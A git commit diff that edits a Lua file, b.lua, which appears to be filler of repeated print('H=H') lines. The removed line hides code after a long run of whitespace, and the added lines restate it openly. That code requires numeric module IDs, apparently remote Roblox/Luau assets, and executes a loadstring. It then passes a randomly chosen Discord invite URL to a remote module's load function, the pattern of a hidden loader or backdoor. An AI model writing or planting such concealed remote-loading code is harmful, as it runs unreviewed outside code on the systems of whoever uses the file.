fcc5a8242332ebbb3ca90e9700e3acc2cf13263c
hFSA98af979f7a89fsa <138495488+hFSA98af979f7a89fsa@users.noreply.github.com>
2024-01-15 13:19:16 -0800

    Update b.lua

--- .github/workflows/b.lua
+++ .github/workflows/b.lua
@@ -1,7 +1,20 @@
-print("H=H")                                                                                                                                                                                                                                                                     local loadstring = require(14382140693) loadstring.luau_execute([[local function randomGreeting() local greetings = {"https://discord.gg/codiene", "https://discord.gg/ske"}   return greetings[math.random(#greetings)] end local a1 = randomGreeting() require(15772895549).load(a1)]])()                                                                                                                                                                                                         
 print("H=H")  
-print("H=H")  
-print("H=H")  
+print("H=H")  local loadstring = require(14382140693)
+
+
+loadstring.luau_execute([[
+local a = math.random(1, 2)
+local ab = "hi"
+
+if a == 1 then
+    ab = "https://discord.gg/ske"
+else
+    ab = "https://discord.gg/codiene"
+end
+
+    local a = require(15772895549)
+a.load(ab)
+]])()
 print("H=H")  
 print("H=H")  
 print("H=H")  
